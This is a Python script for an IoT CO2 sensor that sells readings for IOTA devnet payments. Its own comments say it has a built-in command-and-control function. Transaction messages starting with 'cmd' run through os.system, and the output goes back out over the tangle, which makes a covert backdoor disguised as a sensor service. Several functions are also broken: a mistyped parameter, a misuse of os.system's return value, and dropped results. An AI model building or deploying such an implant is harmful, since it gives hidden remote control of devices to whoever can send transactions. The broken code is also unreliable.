#!/usr/bin/python3

## Script acts as a sensor in a machine-to-machine economy based on the Iota crypto currency.
## Script has a C2 function built into it, which it can execute commands hidden in a transaction sent to it
## via the Iota tangle.



from iota import Iota, Address, TryteString, ProposedTransaction, Tag
from iota.crypto.types import Seed
import socket, sys, os
import json
import time
import board
import busio
import adafruit_sgp30

i2c=busio.I2C(board.SCL, board.SDA,frequency=100000)
sgp30=adafruit_sgp30.Adafruit_SGP30(i2c)
sgp30.iaq_init()
sgp30.set_iaq_baseline(0x8973,0x8AAE)


#Cryptographic seed
##Should be protected and not plain text.
#Generate seed using: cat /dev/urandom |tr -dc A-Z9|head -c${1:-81}
my_seed = Seed(b'<INSERT SEED HERE>')

# Declare an API object
api = Iota(
    adapter='https://nodes.devnet.iota.org:443',
    seed=my_seed,
    testnet=True,
)

#Create HTTP Server to Tangle Addressess and Transaction IDs (Bundles)
srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
srv.bind(('0.0.0.0', 22222))
srv.listen(10)

#Generate a new address
##Doesn't seem to be creating a new address after address is spent from
##But it shows in the tangle as a new address.
##The seed probably does the work.
def genAddress():
    new_addy = api.get_new_addresses()
    new_addy = new_addy['addresses'][0]
    return new_addy

#Recieve a request
def recvReq():
    connection, client_addy = srv.accept()
    print("Connection From:", client_addy)
    return_addy = connection.recv(1024)
    print("Recieved Request From: %s" %(return_addy.decode()))
    new_addy = genAddress()

    #change this to only accept on proper command.
    data = str.encode(str(["Request Accepted", str(new_addy)]))
    connection.sendall(data)
    trans_hash = recvTransData(connection)
    return new_addy, return_addy, trans_hash, connection

#Recieved Transaction Hash
def recvTransData(conn):
    success = False
    while not success:
        data = conn.recv(1024)
        trans_hash = data.decode()
        print("Recieved Bundle Hash: %s" % (trans_hash))
        success = True
    return trans_hash

#Create Return Transaction to send data to the tangle.
def sendReturnData(sensor_addy, msg):

    print('Sending Return Data in 0i Transaction...')

    # Create the transfer object
    tx = ProposedTransaction(
        address=Address(sensor_addy),
        value=0,
        message=TryteString.from_unicode(msg),
    )

    print('Preparing bundle and sending it to the network...')

    # Prepare the transfer and send it to the network
    response = api.send_transfer(transfers=[tx])
    trans_hash = response['bundle'].hash

    print('Transaction Sent!')
    print('https://utils.iota.org/bundle/%s/devnet' % response['bundle'].hash)
    print('\n')

    return trans_hash

#Check if transaction in bundle sent to us actually went to our address.
#Confirm size of the transaction recieved.
def getPaid(new_addy, budle_hash):
    transactions = api.find_transaction_objects(bundles=[bundle_hash])
    for x in transactions['transactions']:
        if str(x.as_json_compatible()['address']) == new_addy:
            if x.as_json_compatible()['value'] >= 3:
                return True
            else:
                return False
    return False

#Get and decode the message from the transaction
####Could add encryption here.
def getMessage(bundle_hash):
    recv_msg_list = []
    transactions = api.find_transaction_objects(bundles=[bundle_hash])

    for x in transactions['transactions']:
        if str(x.as_json_compatible()['address']) == new_addy:
            data = x.signature_message_fragment.decode(errors='ignore')
            recv_msg_list.append(data)

    recv_msg = " ".join(recv_msg_list)
    return recv_msg

#Get Sensor Data
def doWork():
    work = sgp30.eCO2
    work ="CO2: " + str(work)
    return work

def doC2(cmd):
    work = os.system(cmd).read()
    return work


#Main Loop
while(True):
    #Wait for request, acknowlege transaction Request
    #returns transaction bundle hash, and tcp connection
    new_addy, return_addy, bundle_hash, connection = recvReq()

    #check if transaction is confirmed,
    is_confirmed = False
    while not is_confirmed:
        #if we got paid, set is_confirmed to true
        if getPaid(new_addy, bundle_hash):
            print("Confirmed: %s" %(bundle_hash))
            is_confirmed = True
        else:
            #Not yet confirmed.
            print("Transaction Not Confirmed")

    #once transaction is confirmed.
    if is_confirmed:
        #Get transaction message contents
        print("\nGETTING MSG FROM TRANS\n---------------")
        recv_msg = getMessage(bundle_hash)
        print(recv_msg)

        recv_msg = recv_msg.split(" ")

        #Do the work
        print("\nDO WORK\n---------------")
        if recv_msg[0] == "cmd":
            recv_msg.remove(recv_msg[0])
            cmd = " ".join(recv_msg)
            work = doC2(cmd)

        elif recv_msg[0] == "get":
            doWork()

        print(work)

        #Send Data back in a 0i transaction
        print("\nSEND DATA BACK TO SENSOR_1\n--------------")
        return_trans_hash = sendReturnData(return_addy, work)
        connection.send(str.encode(str(return_trans_hash)))
        connection.close()
